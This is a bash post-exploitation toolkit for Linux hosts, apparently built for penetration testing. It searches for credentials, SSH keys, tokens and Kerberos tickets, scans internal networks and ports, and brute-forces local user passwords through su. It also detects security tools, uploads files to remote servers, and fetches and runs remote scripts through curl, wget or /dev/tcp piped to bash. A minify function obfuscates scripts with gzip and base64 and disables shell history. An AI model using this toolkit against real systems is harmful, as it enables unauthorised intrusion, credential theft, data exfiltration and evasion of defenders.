# ======================================================================================================================
# monitoring

function action_fsmon() {
  local monpath="$1"
  local filesnum=${2:-30}

  clear
  echo "[files: ${filesnum}] $(date)"
  separator

  local files
  while true; do
    files=$(find "$monpath" \( -path "/proc" -o -path "/sys" \) -prune -o -type f -mmin -5 -printf "%T@ %p\n" 2>/dev/null | sort -nr | head -n "$filesnum")

    clear
    echo "[files: ${filesnum}] $(date)"
    separator

    while IFS= read -r line; do
      echo "$line"
    done <<< "$files"

    sleep 1
  done
}

# ======================================================================================================================

function script_info() {

  if [[ "$1" == "-h" ]]; then
    echo -e "${GREEN}usage:${NC} $SCRIPT $INNER_SCRIPT [action]\n"
    echo -e " ${BLUE}actions:${NC}"
    echo -e "   ${YELLOW}system${NC}        \t OS, kernel, CPU, memory, disk, mounts, processes"
    echo -e "   ${YELLOW}users${NC}         \t passwd, groups, sudoers, ssh keys"
    echo -e "   ${YELLOW}cron${NC}          \t cron jobs, at jobs"
    echo -e "   ${YELLOW}network${NC}       \t interfaces, routes, iptables, arp"
    echo -e "   ${YELLOW}services${NC}      \t systemd, services"
    echo -e "   ${YELLOW}kerberos${NC}      \t check is domain joined, env krb"
    echo -e "   ${YELLOW}isincontainer${NC} \t check if inside docker or lxc"
    echo -e "\n no action - run all"
    exit 1
  fi

  local actions="system users cron network services kerberos isincontainer"

  # run separate action
  if [[ -n $1 ]]; then
    eval "action_$1"
    return $?
  fi

  # else run all
  action_system
  action_users
  action_cron
  action_network
  action_services
  action_kerberos
  action_isincontainer
}

function script_files() {
  if [[ "$1" == "-h" ]]; then
    echo -e "${GREEN}usage:${NC} $SCRIPT $INNER_SCRIPT [<action>|all] [path]\n"
    echo -e " ${BLUE}actions:${NC}"
    echo -e "   ${YELLOW}credskeys${NC}     [path] \t .htpasswd, id_rsa, .key, .pem, .crt, ..."
    echo -e "   ${YELLOW}env${NC}           [path] \t .env, .hashes, .credentials files"
    echo -e "   ${YELLOW}history${NC}       [path] \t history files"
    echo -e "   ${YELLOW}kerberos${NC}      [path] \t kerberos tickets"
    echo -e "   ${YELLOW}usernotes${NC}     [path] \t try to find user notes text files"
    echo -e "   ${YELLOW}projectconfig${NC} [path] \t project configs (*config* *setting* for .php .py .rb .sh .go .js)"
    echo -e "   ${YELLOW}db${NC}            [path] \t db files & sql (.sql .db .sqlite3)"
    echo -e "   ${YELLOW}dockerfile${NC}    [path] \t Dockerfile files"
    echo -e "   ${YELLOW}backups${NC}       [path] \t backup files (.bak .backup passwd* shadow*)"
    echo -e "   ${YELLOW}script${NC}        [path] \t script files"
    echo -e "   ${YELLOW}sysconfigs${NC}    [path] \t .conf .config .cnf .cf"
    echo -e "   ${YELLOW}docs${NC}          [path] \t .xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*"
    echo -e "   ${YELLOW}archives${NC}      [path] \t archives files (.zip .rar .7z)"
    echo -e "   ${YELLOW}large${NC}         [path] \t large files +100M (largest 50)"
    echo -e "   ${YELLOW}recent${NC}        [path] \t recent modified files < 5min"
    echo -e "   ${YELLOW}suid${NC}          [path] \t SUID & GUID files"
    echo -e "   ${YELLOW}acl${NC}           [path] \t ACL files"
    echo -e "   ${YELLOW}vim${NC}           [path] \t .vim related sensitive files"
    echo -e "\n no action - run all"
    exit 1
  fi

  local actions="credskeys env history kerberos usernotes projectconfig db dockerfile backups script sysconfigs docs archives large recent suid acl vim"

  # run separate action
  if [[ -n $1 && "$1" != "all" ]]; then
    eval "action_search_${1}_files \"${2}\""
    return $?
  fi

  action_search_credskeys_files "$2"
  action_search_env_files "$2"
  action_search_history_files "$2"
  action_search_kerberos_files "$2"
  action_search_usernotes_files "$2"
  action_search_projectconfig_files "$2"
  action_search_db_files "$2"
  action_search_dockerfile_files "$2"
  action_search_backups_files "$2"
  action_search_script_files "$2"
  action_search_sysconfigs_files "$2"
  action_search_docs_files "$2"
  action_search_archives_files "$2"
  action_search_large_files "$2"
  action_search_recent_files "$2"
  action_search_suid_files "$2"
  action_search_acl_files "$2"
  action_search_vim_files "$2"
}

function script_search_writable_dirs_files() {
  if [[ "$1" == "-h" ]]; then
    echo -e "${GREEN}usage:${NC} $SCRIPT $INNER_SCRIPT [<action>|all] [path]\n"
    echo -e " ${BLUE}actions:${NC}"
    echo -e "   ${YELLOW}dirs${NC}  [path]     \t search writable dirs"
    echo -e "   ${YELLOW}files${NC} [path]     \t search writable files"
    exit 1
  fi

  if [[ -n $1 && "$1" != "all" ]]; then
    eval "action_passwords_${1} \"${2}\""
    return $?
  fi

  action_search_writable_dirs "$2"
  action_search_writable_files "$2"
}

function script_passwords() {
  if [[ "$1" == "-h" ]]; then
    echo -e "search for passwords, tokens, secrets in files\n"
    echo -e "${GREEN}usage:${NC} $SCRIPT $INNER_SCRIPT [<action>|all] [path]\n"
    echo -e " ${BLUE}actions:${NC}"
    echo -e "   ${YELLOW}sshkeys${NC}    [path]     \t ssh private keys"
    echo -e "   ${YELLOW}sshpgpkeys${NC} [path]     \t ssh, pgp keys"
    echo -e "   ${YELLOW}secrets${NC}    [path]     \t passwords, api tokens, secrets"
    exit 1
  fi

  local actions="sshkeys sshpgpkeys secrets"

  # run separate action
  if [[ -n $1 && "$1" != "all" ]]; then
    eval "action_passwords_${1} \"${2}\""
    return $?
  fi

  action_passwords_sshkeys "$2"
  action_passwords_sshpgpkeys "$2"
  action_passwords_secrets "$2"
}

function script_logs() {
  if [[ "$1" == "-h" ]]; then
    echo -e "${GREEN}usage:${NC} $SCRIPT $INNER_SCRIPT [action]\n"
    echo -e " ${BLUE}actions:${NC}"
    echo -e "   ${YELLOW}secrets${NC}           \t passwords, tokens, secrets"
    echo -e "   ${YELLOW}users${NC}             \t login, user, session, authentication"
    echo -e "   ${YELLOW}execshells${NC}        \t shells / commands / reverse shells"
    echo -e "   ${YELLOW}errors${NC}            \t errors, failures, denied, unauthorized"
    echo -e "   ${YELLOW}weblogs${NC}           \t web server logs"
    echo -e "   ${YELLOW}sudosu${NC}            \t sudo / su attempts"
    echo -e "   ${YELLOW}ipurls${NC}            \t IPs, URLs, base64"
    echo -e "   ${YELLOW}tips${NC}              \t see logs also list"
    echo -e "\n no action - run all"
    exit 1
  fi

  local actions="secrets users execshells errors weblogs sudosu ipurls tips"

  # run separate action
  if [[ -n $1 ]]; then
    eval "action_logs_${1}"
    return $?
  fi

  action_logs_secrets
  action_logs_users
  action_logs_execshells
  action_logs_errors
  action_logs_weblogs
  action_logs_sudosu
  action_logs_ipurls
  action_logs_tips
}

function script_installed_soft() {
  action_installed_packages
}

function script_scan_local_networks() {
    if [[ "$1" == "-h" ]]; then
      echo -e "${GREEN}usage:${NC} $SCRIPT $INNER_SCRIPT [IP/CIDR]"
      exit 1
    fi

    get_ips_and_masks() {

        if [[ -n $1 ]]; then
          echo "$1"
          return
        fi

        if command -v ip &>/dev/null; then
            ip -4 addr show scope global | awk '/inet / {print $2}'
        elif command -v ifconfig &>/dev/null; then
            ifconfig | awk '/inet / && $2 != "127.0.0.1" {print $2, $4}' | while read ip mask; do
                echo "$ip/$(mask2cidr $mask)"
            done
        else
            cat /proc/net/fib_trie | grep '+--' | awk '{print $2}' | sort -u | grep -vE '^127|^0'
        fi
    }

    mask2cidr() {
        local mask=$1
        IFS=. read -r i1 i2 i3 i4 <<< "$mask"
        local bin=$(printf "%08d%08d%08d%08d" \
            "$(bc <<< "obase=2;$i1")" \
            "$(bc <<< "obase=2;$i2")" \
            "$(bc <<< "obase=2;$i3")" \
            "$(bc <<< "obase=2;$i4")")
        echo "${bin//0/}" | wc -c
    }

    ip_to_int() {
        local ip="$1"
        IFS=. read -r o1 o2 o3 o4 <<< "$ip"
        echo $(( (o1 << 24) + (o2 << 16) + (o3 << 8) + o4 ))
    }

    int_to_ip() {
        local ip=$1
        echo "$(( (ip >> 24) & 255 )).$(( (ip >> 16) & 255 )).$(( (ip >> 8) & 255 )).$(( ip & 255 ))"
    }

    # print found IPs and masks
    echo -e "${GREEN}[+]${NC} Local IP/mask:"
    get_ips_and_masks $1

    for cidr in $(get_ips_and_masks $1); do
        IFS=/ read ip mask <<< "$cidr"
        [[ -z "$ip" || -z "$mask" ]] && continue

        echo -e "\n${YELLOW}[*] Scanning $cidr${NC}"
        ip_int=$(ip_to_int "$ip")
        netmask=$(( 0xFFFFFFFF << (32 - mask) & 0xFFFFFFFF ))
        network=$(( ip_int & netmask ))
        broadcast=$(( network | ~netmask & 0xFFFFFFFF ))

        for ((host=network+1; host<broadcast; host++)); do
            target=$(int_to_ip "$host")
            [[ "$target" == "$ip" ]] && continue
            (ping -c1 -W1 "$target" &>/dev/null && echo -e "${GREEN}[+]${NC} Host up: $target") &
        done
        wait
    done
}

function script_gtfobins() {
  local bins="7z aa-exec ab agetty alpine ansible-playbook ansible-test aoss apache2ctl apt apt-get ar aria2c arj arp as ascii85 ascii-xfr ash aspell at atobm awk aws base32 base58 base64 basenc basez bash batcat bc bconsole bpftrace bridge bundle bundler busctl busybox byebug bzip2 c89 c99 cabal cancel capsh cat cdist certbot check_by_ssh check_cups check_log check_memory check_raid check_ssl_cert check_statusfile chmod choom chown chroot clamscan cmp cobc column comm composer cowsay cowthink cp cpan cpio cpulimit crash crontab csh csplit csvtool cupsfilter curl cut dash date dc dd debugfs dialog diff dig distcc dmesg dmidecode dmsetup dnf docker dos2unix dosbox dotnet dpkg dstat dvips easy_install eb ed efax elvish emacs enscript env eqn espeak ex exiftool expand expect facter file find finger fish flock fmt fold fping ftp gawk gcc gcloud gcore gdb gem genie genisoimage ghc ghci gimp ginsh git grc grep gtester gzip hd head hexdump highlight hping3 iconv iftop install ionice ip irb ispell jjs joe join journalctl jq jrunscript jtag julia knife ksh ksshell ksu kubectl latex latexmk ldconfig ld.so less lftp links ln loginctl logsave look lp ltrace lua lualatex luatex lwp-download lwp-request mail make man mawk minicom more mosquitto mount msfconsole msgattrib msgcat msgconv msgfilter msgmerge msguniq mtr multitime mv mysql nano nasm nawk nc ncdu ncftp neofetch nft nice nl nm nmap node nohup npm nroff nsenter ntpdate octave od openssl openvpn openvt opkg pandoc paste pax pdb pdflatex pdftex perf perl perlbug pexec pg php pic pico pidstat pip pkexec pkg posh pr pry psftp psql ptx puppet pwsh python rake rc readelf red redcarpet redis restic rev rlogin rlwrap rpm rpmdb rpmquery rpmverify rsync rtorrent ruby run-mailcap run-parts runscript rview rvim sash scanmem scp screen script scrot sed service setarch setfacl setlock sftp sg shuf slsh smbclient snap socat socket soelim softlimit sort split sqlite3 sqlmap ss ssh ssh-agent ssh-keygen ssh-keyscan sshpass start-stop-daemon stdbuf strace strings su sudo sysctl systemctl systemd-resolve tac tail tar task taskset tasksh tbl tclsh tcpdump tdbtool tee telnet terraform tex tftp tic time timedatectl timeout tmate tmux top torify torsocks troff tshark ul unexpand uniq unshare unsquashfs unzip update-alternatives uudecode uuencode vagrant valgrind varnishncsa vi view vigr vim vimdiff vipw virsh volatility w3m wall watch wc wget whiptail whois wireshark wish xargs xdg-user-dir xdotool xelatex xetex xmodmap xmore xpad xxd xz yarn yash yelp yum zathura zip zsh zsoelim zypper"

  echo -e "${GREEN}#${NC} https://gtfobins.github.io/\n"
  echo -e "${YELLOW}[*]${NC} Checking for installed GTFOBins..."

  for bin in $bins; do
    if which "$bin" &>/dev/null; then
      local bpath=$(which "$bin")
      local prefix="${GREEN}[+]${NC}"
      if [[ -u $bpath || -g $bpath ]]; then
        prefix="${RED}[!]${NC}"
      fi
      local perms=$(ls -la "$bpath" 2>/dev/null | cut -d' ' -f1)
      echo -e "${prefix} ${perms} ${bin}      \t https://gtfobins.github.io/gtfobins/${bin}/"
    fi
  done
}

function script_ports_scanner() {
  if [[ -z $1 ]]; then
    echo -e "${GREEN}usage:${NC} $SCRIPT $INNER_SCRIPT <IP> [start port - 1] [end port - 65535]"
    exit 1
  fi

  local IP=$1
  local START_PORT=${2:-1}
  local END_PORT=${3:-65535}
  local PROTO=${4:-tcp}

  header "scanning ${IP} ${START_PORT}-${END_PORT}"
  for (( port=$START_PORT; port<=$END_PORT; port++ )); do
    (echo > /dev/$PROTO/$IP/$port) &>/dev/null && echo "$IP $port"
  done
}

function script_ports_ncscanner() {
  if [[ -z $1 ]]; then
    echo -e "${GREEN}usage:${NC} $SCRIPT $INNER_SCRIPT <IP> [start port-1] [end port-65535]"
    #echo -e "usage: $SCRIPT $INNER_SCRIPT <IP> [start port-1] [end port-65535] [tcp|udp]"
    #echo -e " udp scan is very slow - 1 second per port"
    exit 1
  fi

  local IP=$1
  local START_PORT=${2:-1}
  local END_PORT=${3:-65535}

  header "scanning ${IP} ${START_PORT}-${END_PORT} ${PROTO}"
  local PROTO=""
  if [[ "$4" == "udp" ]]; then
    PROTO="u -w 1"
  fi
  nc -zv${PROTO} $IP ${START_PORT}-${END_PORT}
}

function script_sendfile() {
  if [[ "$1" == "-h" || -z $1 || -z $2 || ! -f $2 ]]; then
    echo -e "${GREEN}usage:${NC} $SCRIPT $INNER_SCRIPT <FILEPATH> <[http(s)://]URL>"
    exit 1
  fi

  local FILEPATH=$1
  local URL=$2
  local CHECKSUM=$(md5sum $FILEPATH)

  local rslt=1

  warn "md5sum $CHECKSUM"

  # try send file using https
  if [[ $URL == https* ]]; then
    action_send_file_https "$FILEPATH" "$URL"
    rslt=$?

  # try send using http
  elif [[ $URL == http* ]]; then
    action_send_file_http "$FILEPATH" "$URL"
    rslt=$?
  fi

  # TODO: smb://, ftp://, nc://
  # TODO: encrypt file & show key in terminal (??)

  if [ $rslt -ne 0 ]; then
    warn "failed to send file, try another method, e.g. start server & D/L"
  fi
}

function script_start_httpserver() {
  if [[ "$1" == "-h" ]]; then
    echo -e "${GREEN}usage:${NC} $SCRIPT $INNER_SCRIPT [port] [directory]"
    exit 1
  fi

  local PORT=8080
  if [[ -n $1 ]]; then
    PORT="$1"
  fi

  if [[ -n $2 ]]; then
    if [[ ! -d $2 ]]; then
      echo -e "directory not found: $2"
      exit 1
    fi
    cd "$2" || exit 1
  fi

  header "starting http server on $PORT and dir $(pwd)"

  local rslt=1

  # python3
  if which python3 &> /dev/null; then
    python3 -m http.server $PORT
    rslt=$?
  fi

  # python2.7
  if [ "$rslt" -ne 0 ] && which python2.7 &> /dev/null; then
    python2.7 -m SimpleHTTPServer $PORT
    rslt=$?
  fi

  # php
  if [ "$rslt" -ne 0 ] && which php &> /dev/null; then
    php -S 0.0.0.0:$PORT
    rslt=$?
  fi

  # ruby
  if [ "$rslt" -ne 0 ] && which ruby &> /dev/null; then
    ruby -run -ehttpd . -p$PORT
    rslt=$?
  fi

  # nodejs
  if [ "$rslt" -ne 0 ] && which node &> /dev/null; then
    local js='Y29uc3QgaHR0cD1yZXF1aXJlKCJodHRwIiksZnM9cmVxdWlyZSgiZnMiKSxwYXRoPXJlcXVpcmUoInBhdGgiKSxwb3J0PSI8UE9SVD4iLHB1YmxpY0Rpcj0iLiIsc2VydmVyPWh0dHAuY3JlYXRlU2VydmVyKCgoZSx0KT0+e2xldCByPXBhdGguam9pbigiLiIsIi8iPT09ZS51cmw/ImluZGV4Lmh0bWwiOmUudXJsKTtmcy5yZWFkRmlsZShyLCgoZSxuKT0+e2U/IkVOT0VOVCI9PT1lLmNvZGU/KHQud3JpdGVIZWFkKDQwNCx7IkNvbnRlbnQtVHlwZSI6InRleHQvcGxhaW4ifSksdC5lbmQoIjQwNCBOb3QgRm91bmQiKSk6KHQud3JpdGVIZWFkKDUwMCx7IkNvbnRlbnQtVHlwZSI6InRleHQvcGxhaW4ifSksdC5lbmQoIjUwMCBJbnRlcm5hbCBTZXJ2ZXIgRXJyb3I6ICIrZS5tZXNzYWdlKSk6KHQud3JpdGVIZWFkKDIwMCx7IkNvbnRlbnQtRGlzcG9zaXRpb24iOmBhdHRhY2htZW50OyBmaWxlbmFtZT0iJHtwYXRoLmJhc2VuYW1lKHIpfSJgLCJDb250ZW50LUxlbmd0aCI6bi5sZW5ndGh9KSx0LmVuZChuKSl9KSl9KSk7c2VydmVyLmxpc3Rlbihwb3J0LCgoKT0+e2NvbnNvbGUubG9nKGBTZXJ2ZXIgbGlzdGVuaW5nIG9uIHBvcnQgJHtwb3J0fWApfSkpOw=='
    local decoded="$(echo $js | base64 -d)"
    decoded="${decoded/\"<PORT>\"/${PORT}}"
    node -e "$decoded"
    rslt=$?
  fi
}

function script_bruteforce_localuser() {
  if [[ -z "$1" || -z "$2" || ! -f "$2" ]]; then
    echo -e "${GREEN}usage:${NC} $SCRIPT $INNER_SCRIPT <user> <password list filepath>"
    exit 1
  fi

  local username="$1"
  local passlist="$2"

  header "brutforce local user: ${username}"

  local password
  while read -r password; do
    echo -n '.'
    if echo "${password}" | timeout 0.2 su - "${username}" -c 'whoami' | grep -q "${username}"; then
      echo ""
      echo -e "${YELLOW}SUCCESS User: '${username}'; Password: '${password}'"
      exit 0
    fi
  done < "${passlist}"

  echo -e "No password found"
  exit 1
}

function script_detect_security_tools() {
    header "detect security & defence tools"

    if pgrep auditd &> /dev/null; then
      echo -e "${GREEN}[+]${NC} Auditd (security audit logging)"
    fi

    if pgrep ossec &> /dev/null; then
      echo -e "${GREEN}[+]${NC} OSSEC (intrusion detection)"
    fi

    if pgrep iptables &> /dev/null; then
      echo -e "${GREEN}[+]${NC} iptables (firewall)"
    fi

    if pgrep ufw &> /dev/null; then
      echo -e "${GREEN}[+]${NC} ufw (firewall)"
    fi

    if [[ -d /etc/tripwire ]]; then
      echo -e "${GREEN}[+]${NC} Tripwire (file integrity monitoring)"
    fi

    if [[ -d /etc/aide ]]; then
      echo -e "${GREEN}[+]${NC} AIDE (file integrity monitoring)"
    fi

    if [[ -d /etc/apparmor.d ]]; then
      echo -e "${GREEN}[+]${NC} AppArmor (application security profiling)"
    fi

    if [[ -d /etc/chkrootkit ]]; then
      echo -e "${GREEN}[+]${NC} chkrootkit (rootkit scanner)"
    fi

    if [[ -d /etc/selinux ]]; then
      echo -e "${GREEN}[+]${NC} SELinux (mandatory access control enforcement)"
    fi

    if [[ -d /etc/fluent-bit ]]; then
      echo -e "${GREEN}[+]${NC} Fluent Bit (log collection)"
    fi

    if [[ -f /etc/rkhunter.conf ]]; then
      echo -e "${GREEN}[+]${NC} Rootkit Hunter (rootkit scanner)"
    fi
}

function script_start_smb_server() {
    header "TODO starting smb server"
    # TODO
}

function script_start_ftp_server() {
    header "TODO starting ftp server"

}

function script_exec_remote_bash() {
  if [[ "$1" == "-h" || -z $1 ]]; then
    echo -e "${GREEN}usage:${NC} $SCRIPT $INNER_SCRIPT <SCRIPT_URL>"
    echo -e " ${YELLOW}example:${NC} $SCRIPT $INNER_SCRIPT https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
    echo -e "\n ${YELLOW}some useful scripts:${NC}"
    echo -e "  LinPEAS           https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
    echo -e "  LES               https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/refs/heads/master/linux-exploit-suggester.sh"
    echo -e "  LinEnum           https://raw.githubusercontent.com/rebootuser/LinEnum/refs/heads/master/LinEnum.sh"
    echo -e "  Linux Smart Enum  https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/refs/heads/master/lse.sh"
    exit 1
  fi

  local URL="$1"
  local HOST="${URL##*://}"
  HOST="${HOST%%/*}"
  local PORT=80
  local URLPATH="/$(echo "$URL" | cut -d'/' -f4-)"

  if [[ "$HOST" == *:* ]]; then
    PORT="${HOST##*:}"
    HOST="${HOST%%:*}"
  fi

  rslt=1

  if [ "$rslt" -ne 0 ] && which curl &> /dev/null; then
    curl -A "$UA" -SsL --insecure $URL | bash
    rslt=$?
  fi

  if [ "$rslt" -ne 0 ] && which wget &> /dev/null; then
    wget --user-agent="$UA" -q -O - $URL | bash
    rslt=$?
  fi

  if [ "$rslt" -ne 0 ] && which php &> /dev/null; then
    php -r "\$lines = @file('${URL}'); foreach (\$lines as \$line_num => \$line) { echo \$line; }" | bash
    rslt=$?
  fi

  if [ "$rslt" -ne 0 ]; then
    exec 3<>/dev/tcp/$HOST/$PORT
    echo -e "GET $URLPATH HTTP/1.1\r\n\r\n">&3
    bash <&3
    rslt=$?
    exec 3>&-
  fi

}

function script_download_file() {
  if [[ "$1" == "-h" || -z $1 ]]; then
    echo -e "${GREEN}usage:${NC} $SCRIPT $INNER_SCRIPT <[http(s)://]FILE_URL>"
    exit 1
  fi

  local URL=$1

  if [[ "$1" == https* ]]; then
    action_download_file_https "$1"
  elif [[ "$1" == http* ]]; then
    action_download_file_http "$1"
  elif [[ "$1" == smb* ]]; then
    echo 'TODO smb://'
  elif [[ "$1" == ftp* ]]; then
    echo 'TODO ftp://'
  elif [[ "$1" == nc* ]]; then
    echo 'TODO nc://'
  fi
}

function script_fsmon() {
  if [[ "$1" == "-h" || -z $1 ]]; then
    echo -e "${GREEN}usage:${NC} $SCRIPT $INNER_SCRIPT <path> [count of files]"
    exit 1
  fi

  action_fsmon "$1" $2
}

function script_minify() {
  if [[ "$1" == "-h" || -z $1 || ! -f $1 ]]; then
    echo -e "${GREEN}usage:${NC} $SCRIPT $INNER_SCRIPT <script path> [output script name]"
    exit 1
  fi

  local filepath="$1"
  local outpath="${filepath}.out"
  if [[ -n "$2" ]]; then
    outpath="$2"
  fi

  echo '#!/bin/bash' > "$outpath"
  echo 'export HISTSIZE=0' >> "$outpath"
  echo 'export HISTFILE=/dev/null' >> "$outpath"
  echo -n "echo '" >> "$outpath"
  cat "$filepath" | sed '/^\s*$/d' | gzip -9 | base64 -w 0 >> "$outpath"
  echo -n "' | base64 -d | gunzip | bash -s -- \"\$1\" \"\$2\" \"\$3\" \"\$4\" \"\$5\" \"\$6\"" >> "$outpath"
}

function script_help() {
  help

  echo -e " -h \t script help"
  echo -e " -v \t script version"

  header "privesc & enum scripts (tip: use ${NC}rexec${YELLOW} script to run from server)"
  tips "linpeas.sh                 https://github.com/peass-ng/PEASS-ng/releases"
  tips "LinEnum.sh                 https://github.com/rebootuser/LinEnum"
  tips "lse.sh                     https://github.com/diego-treitos/linux-smart-enumeration"
  tips "linikatz.sh                https://github.com/CiscoCXSecurity/linikatz"
  tips "mimipenguin.sh             https://github.com/huntergregal/mimipenguin"
  tips "linux-exploit-suggester    https://github.com/The-Z-Labs/linux-exploit-suggester"
  tips "linux-exploit-suggester-2  https://github.com/jondonas/linux-exploit-suggester-2"
  tips "bashark.sh                 https://github.com/redcode-labs/Bashark"
  tips "linuxprivchecker.py        https://github.com/sleventyeleven/linuxprivchecker"
  tips "https://gtfobins.github.io/"
  separator

  header "transfer files"
  echo -e "using openssl"
  echo -e " server:"
  tips "openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem"
  tips "openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh"
  echo -e " client:"
  tips "openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh"
  separator

  header "/proc/<proc id>; use \"cat /proc/<proc id>/cmdline | tr '\000' ' '\""
  tips "/proc/<proc id>/cmdline \t full process command line"
  tips "/proc/<proc id>/cwd     \t process working directory"
  tips "/proc/<proc id>/enwiron \t process environment vars"
  tips "/proc/<proc id>/exe     \t points to the bin that started the process"
  tips "/proc/<proc id>/task    \t subdirs for each thread started the process"
  tips "/proc/<proc id>/status  \t process status"
  tips "/proc/<proc id>/fd      \t file descriptor in use"
  separator

  header "find tips"
  tips "find / -type f -perm -o=rwx \t search rwx files for all"
  tips "find / -type f -perm -u=s   \t search SUID files"
  separator

}

function help() {
    echo -e "${GREEN}usage:${NC} ${SCRIPT} ${YELLOW}<script>${NC} [params]\n"

    echo -e " ${BLUE}gather info scripts:${NC}"
    echo -e "   ${YELLOW}info${NC}          [-h]         \t fast - prints users, netstat, etc..."
    echo -e "   ${YELLOW}files${NC}         [-h]         \t search db, sql, backup, scripts, config, SUID, GUID files"
    echo -e "   ${YELLOW}passwords${NC}     [-h]         \t search passwords, ssh keys, api keys, tokens in files (slow)"
    echo -e "   ${YELLOW}logs${NC}          [-h]         \t search interesting in logs"
    echo -e "   ${YELLOW}searchw${NC}                    \t search writable directories & files"
    echo -e "   ${YELLOW}installedsoft${NC}              \t list installed packages & soft"
    echo -e "   ${YELLOW}gtfobins${NC}                   \t check for installed GTFOBins"

    echo -e "\n ${BLUE}scaner scripts:${NC}"
    echo -e "   ${YELLOW}networkscan${NC}   [params]     \t scan internal network(s) for avail hosts"
    echo -e "   ${YELLOW}ncscan${NC}        [params]     \t simple TCP ports scanner using nc (preferable)"
    echo -e "   ${YELLOW}bashscan${NC}      [params]     \t simple TCP ports scanner using bash"

    echo -e "\n ${BLUE}transfer files scripts:${NC}"
    echo -e "   ${YELLOW}sendf${NC}         [params]     \t send file to remote server (http[s])"
    echo -e "   ${YELLOW}download${NC}      [params]     \t download file (http[s])"

    echo -e "\n ${BLUE}local server scripts:${NC}"
    echo -e "   ${YELLOW}httpserver${NC}    [params]     \t start http server"
#    echo -e "   ${YELLOW}ftpserver${NC}    [params]     \t start ftp server"
#    echo -e "   ${YELLOW}smbserver${NC}    [params]     \t start smb server"

    echo -e "\n ${BLUE}monitor scripts:${NC}"
    echo -e "   ${YELLOW}fsmon${NC}         [params]     \t monitoring FS changes"

    echo -e "\n ${BLUE}bruteforce scripts:${NC}"
    echo -e "   ${YELLOW}localuser${NC}     [params]     \t bruteforce local user (using bash su -)"

    echo -e "\n ${BLUE}other:${NC}"
    echo -e "   ${YELLOW}rexec${NC}         [params]     \t execute remote bash|sh script"
    echo -e "   ${YELLOW}sectooldetect${NC} [params]     \t detect security tools"
    echo -e "   ${YELLOW}minify${NC}        [params]     \t minify script using gzip & base64"

    echo -e "---\n\nhelp or -h: help & tips"
}

scripts="info files passwords logs searchw installedsoft gtfobins networkscan bashscan ncscan sendf httpserver ftpserver smbserver rexec download fsmon minify localuser sectooldetect help -h -v"
if [[ -z "$1" || ! "$scripts" =~ (^|[[:space:]])"$1"($|[[:space:]]) ]]; then
  help
  exit 1
fi

case "$INNER_SCRIPT" in
  "info") script_info "$2" ;;
  "files") script_files "$2" "$3" ;;
  "searchw") script_search_writable_dirs_files "$2" "$3" ;;
  "passwords") script_passwords "$2" "$3" ;;
  "logs") script_logs "$2" ;;
  "installedsoft") script_installed_soft ;;
  "gtfobins") script_gtfobins ;;
  
  "networkscan") script_scan_local_networks "$2" "$3" "$4" "$5" ;;
  "bashscan") script_ports_scanner "$2" "$3" "$4" "$5" ;;
  "ncscan") script_ports_ncscanner "$2" "$3" "$4" "$5" ;;

  "sendf") script_sendfile "$2" "$3" ;;
  "httpserver") script_start_httpserver "$2" "$3" ;;
  "ftpserver") script_start_ftp_server "$2" ;;
  "smbserver") script_start_smb_server "$2" ;;
  "rexec") script_exec_remote_bash "$2" ;;
  "download") script_download_file "$2" ;;
  "fsmon") script_fsmon "$2" "$3" ;;

  "localuser") script_bruteforce_localuser "$2" "$3" ;;

  "sectooldetect") script_detect_security_tools ;;
  "minify") script_minify "$2" "$3" ;;
  "-h"|"help") script_help ;;
  "-v") echo $VERSION ;;

  *) help; exit 1 ;;
esac
